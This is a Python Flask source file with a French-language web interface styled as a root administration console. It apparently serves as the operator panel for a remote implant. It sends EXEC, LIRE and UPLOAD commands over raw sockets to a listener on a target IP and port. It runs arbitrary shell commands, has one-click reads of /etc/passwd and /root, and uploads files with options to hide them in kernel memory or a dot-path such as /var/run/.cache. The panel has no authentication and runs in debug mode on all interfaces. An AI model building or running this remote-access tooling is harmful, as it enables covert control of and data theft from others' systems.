#!/usr/bin/env python3

from flask import Flask, render_template, request, jsonify
import socket
import os
import base64
import tempfile

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Console d'Administration</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background-color: #000;
                color: #0f0;
                margin: 0;
                padding: 0;
                height: 100vh;
                display: flex;
                flex-direction: column;
            }
            
            .terminal-header {
                background-color: #333;
                color: #fff;
                padding: 5px 10px;
                font-weight: bold;
                display: flex;
                justify-content: space-between;
                border-bottom: 1px solid #555;
            }
            
            .terminal-body {
                flex-grow: 1;
                padding: 10px;
                overflow-y: auto;
                display: flex;
                flex-direction: column;
            }
            
            .config-panel {
                display: flex;
                margin-bottom: 10px;
            }
            
            .config-panel input {
                background-color: #222;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 5px;
                margin-right: 10px;
                font-family: 'Courier New', monospace;
            }
            
            .terminal-output {
                background-color: #111;
                border: 1px solid #333;
                padding: 10px;
                flex-grow: 1;
                overflow-y: auto;
                white-space: pre-wrap;
                font-size: 14px;
                margin-bottom: 10px;
                height: 300px;
            }
            
            .prompt {
                display: flex;
                margin-bottom: 10px;
                align-items: center;
            }
            
            .prompt-symbol {
                color: #0f0;
                margin-right: 5px;
            }
            
            .command-input {
                flex-grow: 1;
                background-color: #000;
                color: #0f0;
                border: none;
                font-family: 'Courier New', monospace;
                padding: 5px;
                outline: none;
            }
            
            .button-row {
                display: flex;
                gap: 10px;
                flex-wrap: wrap;
                margin-bottom: 10px;
            }
            
            button {
                background-color: #333;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 5px 10px;
                cursor: pointer;
                font-family: 'Courier New', monospace;
                transition: all 0.3s;
            }
            
            button:hover {
                background-color: #0f0;
                color: #000;
            }
            
            .blink {
                animation: blink-animation 1s steps(2, start) infinite;
            }
            
            @keyframes blink-animation {
                to {
                    visibility: hidden;
                }
            }
            
            .status-info {
                display: flex;
                gap: 15px;
                margin-bottom: 10px;
                background-color: #111;
                padding: 5px 10px;
                border: 1px solid #333;
            }
            
            .status-item {
                display: flex;
                align-items: center;
            }
            
            .status-led {
                height: 10px;
                width: 10px;
                border-radius: 50%;
                margin-right: 5px;
            }
            
            .led-green {
                background-color: #0f0;
                box-shadow: 0 0 5px #0f0;
            }
            
            .led-red {
                background-color: #f00;
                box-shadow: 0 0 5px #f00;
            }
            
            .file-mode-active {
                color: #ff0;
            }
            
            .tab-bar {
                display: flex;
                margin-bottom: 10px;
            }
            
            .tab {
                padding: 5px 15px;
                background-color: #333;
                margin-right: 2px;
                cursor: pointer;
            }
            
            .tab.active {
                background-color: #555;
                border-top: 2px solid #0f0;
            }
            
            .upload-form {
                background-color: #111;
                border: 1px solid #333;
                padding: 10px;
                margin-bottom: 10px;
                display: none;
            }
            
            .upload-form input[type=file] {
                width: 0.1px;
                height: 0.1px;
                opacity: 0;
                overflow: hidden;
                position: absolute;
                z-index: -1;
            }
            
            .upload-form label {
                display: inline-block;
                background-color: #333;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 5px 10px;
                cursor: pointer;
                font-family: 'Courier New', monospace;
                transition: all 0.3s;
                margin-right: 10px;
            }
            
            .upload-form label:hover {
                background-color: #0f0;
                color: #000;
            }
            
            .upload-filename {
                display: inline-block;
                margin-left: 10px;
                color: #ccc;
            }
            
            .hide-options {
                display: flex;
                flex-direction: column;
                margin-top: 10px;
                padding: 5px;
                background-color: #222;
                border: 1px solid #444;
                margin-bottom: 10px;
            }
            
            .hide-option {
                margin: 5px 0;
            }
            
            .hide-option input[type="radio"] {
                margin-right: 10px;
            }
            
            #hide-path {
                background-color: #222;
                color: #0f0;
                border: 1px solid #0f0;
                padding: 5px;
                margin-top: 5px;
                width: 100%;
                font-family: 'Courier New', monospace;
            }
        </style>
    </head>
    <body>
        <div class="terminal-header">
            <div>Console d'Administration Système - Session Root</div>
            <div id="time"></div>
        </div>
        
        <div class="terminal-body">
            <div class="tab-bar">
                <div class="tab active" onclick="changerMode('commande')">Mode Commande</div>
                <div class="tab" onclick="changerMode('fichier')">Mode Fichier</div>
                <div class="tab" onclick="changerMode('upload')">Mode Upload</div>
                <div class="tab" onclick="document.getElementById('commande').value='FICHIERS'; executerCommande()">Liste fichiers</div>
            </div>
            
            <div class="status-info">
                <div class="status-item">
                    <div class="status-led" id="connection-status"></div>
                    <span id="status-text">Déconnecté</span>
                </div>
                <div class="status-item">
                    <span id="machine-info">--</span>
                </div>
                <div class="status-item" id="mode-indicator">
                    Mode: <span class="file-mode-active">Commande</span>
                </div>
            </div>
            
            <div class="config-panel">
                <input type="text" id="ip" placeholder="Adresse IP" value="localhost">
                <input type="text" id="port" placeholder="Port" value="9000">
                <button onclick="testFunction()">Connecter</button>
            </div>
            
            <div class="terminal-output" id="resultat">Système prêt. En attente de connexion...</div>
            
            <div class="prompt" id="prompt-command">
                <div class="prompt-symbol" id="prompt-text">root@système:~#</div>
                <input type="text" id="commande" class="command-input" placeholder="" onkeydown="if(event.key === 'Enter') executerCommande()">
            </div>
            
            <div class="prompt" id="prompt-file" style="display: none;">
                <div class="prompt-symbol">cat</div>
                <input type="text" id="chemin" class="command-input" placeholder="/chemin/du/fichier" onkeydown="if(event.key === 'Enter') lireFichier()">
            </div>
            
            <div class="upload-form" id="upload-section">
                <form id="upload-form" enctype="multipart/form-data">
                    <label for="file-upload">Sélectionner un fichier</label>
                    <input id="file-upload" type="file" name="file">
                    <span class="upload-filename" id="file-selected">Aucun fichier sélectionné</span>
                    
                    <div class="hide-options">
                        <div><strong>Options de stockage:</strong></div>
                        <div class="hide-option">
                            <input type="radio" name="hide-method" id="hide-kernel" value="kernel" checked>
                            <label for="hide-kernel">Mémoire noyau (volatile)</label>
                        </div>
                        <div class="hide-option">
                            <input type="radio" name="hide-method" id="hide-fs" value="fs">
                            <label for="hide-fs">Système de fichiers</label>
                            <input type="text" id="hide-path" placeholder="/var/run/.cache" style="display: none;">
                        </div>
                    </div>
                    
                    <button type="button" onclick="uploadFichier()">Uploader fichier</button>
                </form>
            </div>
            
            <div class="button-row">
                <button onclick="document.getElementById('commande').value='uname -a'; executerCommande()">uname -a</button>
                <button onclick="document.getElementById('commande').value='id'; executerCommande()">id</button>
                <button onclick="document.getElementById('commande').value='ps aux'; executerCommande()">ps aux</button>
                <button onclick="document.getElementById('commande').value='netstat -tuln'; executerCommande()">netstat -tuln</button>
                <button onclick="document.getElementById('commande').value='ls -la /root'; executerCommande()">ls -la /root</button>
                <button onclick="document.getElementById('commande').value='w'; executerCommande()">users</button>
                <button onclick="document.getElementById('chemin').value='/etc/passwd'; changerMode('fichier'); lireFichier()">passwd</button>
            </div>
        </div>
        
        <script>
          
        </script>
    </body>

    <script>
      let modeActuel = 'commande';
            let connecte = false;
            let port9000Status = false;
            
            function updateClock() {
                const now = new Date();
                let timeText = now.toLocaleTimeString();
                
                // Ajouter l'indicateur de statut du port 9000
                if (port9000Status) {
                    timeText += " | Port 9000: <span style='color: #0f0;'>OUVERT</span>";
                } else {
                    timeText += " | Port 9000: <span style='color: #f00;'>FERMÉ</span>";
                }
                
                document.getElementById('time').innerHTML = timeText;
            }
            
            function verifierPort9000() {
                const ip = document.getElementById('ip').value;
                
                fetch('/api/verifier_port', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip, port: 9000})
                })
                .then(response => response.json())
                .then(data => {
                    port9000Status = data.ouvert;
                    updateClock();
                })
                .catch(error => {
                    console.error("Erreur lors de la vérification du port:", error);
                    port9000Status = false;
                    updateClock();
                });
            }
            
            // Vérifier le port toutes les 5 secondes
            setInterval(verifierPort9000, 5000);
            // Vérifier immédiatement au chargement
            setTimeout(verifierPort9000, 1000);
            
            setInterval(updateClock, 1000);
            updateClock();
            
            document.getElementById('hide-fs').addEventListener('change', function() {
                document.getElementById('hide-path').style.display = this.checked ? 'block' : 'none';
            });
            
            document.getElementById('hide-kernel').addEventListener('change', function() {
                document.getElementById('hide-path').style.display = this.checked ? 'none' : 'block';
            });
            
            document.getElementById('file-upload').addEventListener('change', function() {
                const fileName = this.files[0] ? this.files[0].name : 'Aucun fichier sélectionné';
                document.getElementById('file-selected').textContent = fileName;
            });
            
            function changerMode(mode) {
                modeActuel = mode;
                
                document.getElementById('prompt-command').style.display = 'none';
                document.getElementById('prompt-file').style.display = 'none';
                document.getElementById('upload-section').style.display = 'none';
                
                document.querySelectorAll('.tab').forEach((tab, index) => {
                    if (index < 3) tab.classList.remove('active');
                });
                
                if (mode === 'commande') {
                    document.getElementById('prompt-command').style.display = 'flex';
                    document.getElementById('mode-indicator').innerHTML = 'Mode: <span class="file-mode-active">Commande</span>';
                    document.querySelectorAll('.tab')[0].classList.add('active');
                    document.getElementById('commande').focus();
                } else if (mode === 'fichier') {
                    document.getElementById('prompt-file').style.display = 'flex';
                    document.getElementById('mode-indicator').innerHTML = 'Mode: <span class="file-mode-active">Fichier</span>';
                    document.querySelectorAll('.tab')[1].classList.add('active');
                    document.getElementById('chemin').focus();
                } else if (mode === 'upload') {
                    document.getElementById('upload-section').style.display = 'block';
                    document.getElementById('mode-indicator').innerHTML = 'Mode: <span class="file-mode-active">Upload</span>';
                    document.querySelectorAll('.tab')[2].classList.add('active');
                }
            }
            
            function afficherResultat(texte) {
                const conteneur = document.getElementById('resultat');
                conteneur.textContent = texte;
                conteneur.scrollTop = conteneur.scrollHeight;
            }
            
            function testFunction() {
                const ip = document.getElementById('ip').value;
                const port = document.getElementById('port').value;
                
                document.getElementById('status-text').textContent = 'Tentative de connexion...';
                document.getElementById('connection-status').className = 'status-led';
                
                fetch('/api/executer', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip, port: port, commande: 'id'})
                })
                .then(response => response.json())
                .then(data => {
                    if (data.resultat.startsWith('Erreur')) {
                        document.getElementById('status-text').textContent = 'Déconnecté';
                        document.getElementById('connection-status').className = 'status-led led-red';
                        document.getElementById('machine-info').textContent = '--';
                        connecte = false;
                        afficherResultat(data.resultat);
                    } else {
                        document.getElementById('status-text').textContent = 'Connecté';
                        document.getElementById('connection-status').className = 'status-led led-green';
                        connecte = true;
                        
                        fetch('/api/executer', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ip: ip, port: port, commande: 'hostname'})
                        })
                        .then(response => response.json())
                        .then(hostData => {
                            const hostname = hostData.resultat.trim();
                            document.getElementById('machine-info').textContent = hostname;
                            document.getElementById('prompt-text').textContent = `root@${hostname}:~#`;
                            
                            afficherResultat(`Connexion établie à ${ip}:${port}\nMachine: ${hostname}\n${data.resultat}`);
                        })
                        .catch(error => {
                            document.getElementById('machine-info').textContent = ip;
                            document.getElementById('prompt-text').textContent = `root@${ip}:~#`;
                        });
                    }
                })
                .catch(error => {
                    document.getElementById('status-text').textContent = 'Erreur de connexion';
                    document.getElementById('connection-status').className = 'status-led led-red';
                    connecte = false;
                    afficherResultat('Erreur de connexion au serveur: ' + error);
                });
            }</script>

            <script>
            function executerCommande() {
                const ip = document.getElementById('ip').value;
                const port = document.getElementById('port').value;
                const commande = document.getElementById('commande').value;
                
                if (!commande) return;
                
                const historyEntry = `${document.getElementById('prompt-text').textContent} ${commande}\n`;
                afficherResultat(historyEntry + 'Exécution en cours...');
                
                fetch('/api/executer', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip, port: port, commande: commande})
                })
                .then(response => response.json())
                .then(data => {
                    afficherResultat(historyEntry + data.resultat);
                    
                    if (!connecte && !data.resultat.startsWith('Erreur')) {
                        document.getElementById('status-text').textContent = 'Connecté';
                        document.getElementById('connection-status').className = 'status-led led-green';
                        connecte = true;
                    }
                })
                .catch(error => {
                    afficherResultat(historyEntry + "Erreur: " + error);
                });
                
                document.getElementById('commande').value = '';
            }
           
    
        </script>


        <script>
         function lireFichier() {
                const ip = document.getElementById('ip').value;
                const port = document.getElementById('port').value;
                const chemin = document.getElementById('chemin').value;
                
                if (!chemin) return;
                
                const historyEntry = `cat ${chemin}\n`;
                afficherResultat(historyEntry + 'Lecture en cours...');
                
                fetch('/api/lire', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: ip, port: port, chemin: chemin})
                })
                .then(response => response.json())
                .then(data => {
                    afficherResultat(historyEntry + data.resultat);
                    
                    if (!connecte && !data.resultat.startsWith('Erreur')) {
                        document.getElementById('status-text').textContent = 'Connecté';
                        document.getElementById('connection-status').className = 'status-led led-green';
                        connecte = true;
                    }
                })
                .catch(error => {
                    afficherResultat(historyEntry + "Erreur: " + error);
                });
                
                document.getElementById('chemin').value = '';
            }
                    </script>

        <script>
function uploadFichier() {
    const ip = document.getElementById('ip').value;
    const port = document.getElementById('port').value;
    const fileInput = document.getElementById('file-upload');
    
    if (!fileInput.files.length) {
        afficherResultat("Erreur: Aucun fichier sélectionné");
        return;
    }
    
    const file = fileInput.files[0];
    const reader = new FileReader();
    const hideMethod = document.querySelector('input[name="hide-method"]:checked').value;
    const hidePath = document.getElementById('hide-path').value;
    
    reader.onload = function(e) {
        const fileData = e.target.result.split(',')[1];
        
        // Afficher message de départ sans référence à data
        afficherResultat("Envoi du fichier en cours... Fichier: " + file.name + " - Taille: " + file.size + " octets");
        
        fetch('/api/upload', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                ip: ip, 
                port: port,
                filename: file.name,
                filedata: fileData,
                hidemethod: hideMethod,
                hidepath: hidePath
            })
        })
        .then(response => response.json())
        .then(data => {
            // Maintenant data est défini
            afficherResultat("Envoi du fichier en cours... Fichier: " + file.name + " - Taille: " + file.size + " octets - " + data.resultat);
        })
        .catch(error => {
            afficherResultat("Erreur lors de l'upload: " + error);
        });
    };
    
    reader.readAsDataURL(file);
}
            
            </script>
            <script>
            document.getElementById('commande').focus();
            </script>
    </html>
    '''

@app.route('/api/verifier_port', methods=['POST'])
def verifier_port():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 9000))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        resultat = s.connect_ex((ip, port))
        s.close()
        
        # Si resultat est 0, le port est ouvert
        if resultat == 0:
            return jsonify({"ouvert": True})
        else:
            return jsonify({"ouvert": False})
    except Exception as e:
        return jsonify({"ouvert": False, "erreur": str(e)})

@app.route('/api/executer', methods=['POST'])
def executer():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8001))
    commande = data.get('commande')
    
    resultat = envoyer_commande(ip, port, "EXEC " + commande)
    return jsonify({"resultat": resultat})

@app.route('/api/lire', methods=['POST'])
def lire():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8001))
    chemin = data.get('chemin')
    
    resultat = envoyer_commande(ip, port, "LIRE " + chemin)
    return jsonify({"resultat": resultat})

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port', 8001))
    filename = data.get('filename')
    filedata = data.get('filedata')
    hidemethod = data.get('hidemethod', 'kernel')
    hidepath = data.get('hidepath', '')
    
    try:
        file_content = base64.b64decode(filedata)
        
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            temp_path = temp_file.name
            temp_file.write(file_content)
        
        upload_cmd = f"UPLOAD {filename} {hidemethod}"
        if hidemethod == "fs" and hidepath:
            upload_cmd += f" {hidepath}"
        
        resultat = envoyer_commande(ip, port, upload_cmd)
        
        with open(temp_path, 'rb') as f:
            file_content = f.read()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((ip, int(port)))
            s.sendall(file_content)
            
            reponse = b""
            try:
                s.settimeout(2)
                reponse = s.recv(4096)
            except socket.timeout:
                pass
            s.close()
        
        os.unlink(temp_path)
        
        if reponse:
            return jsonify({"resultat": f"Fichier uploadé avec succès.\n{reponse.decode()}"})
        else:
            return jsonify({"resultat": "Fichier uploadé avec succès."})
            
    except Exception as e:
        return jsonify({"resultat": f"Erreur lors de l'upload: {str(e)}"})

def envoyer_commande(ip, port, message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, int(port)))
        s.send(message.encode())
        
        reponse = b""
        chunk = s.recv(4096)
        while chunk:
            reponse += chunk
            try:
                s.settimeout(0.5)
                chunk = s.recv(4096)
            except socket.timeout:
                break
        
        s.close()
        return reponse.decode()
    except Exception as e:
        return f"Erreur: {str(e)}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
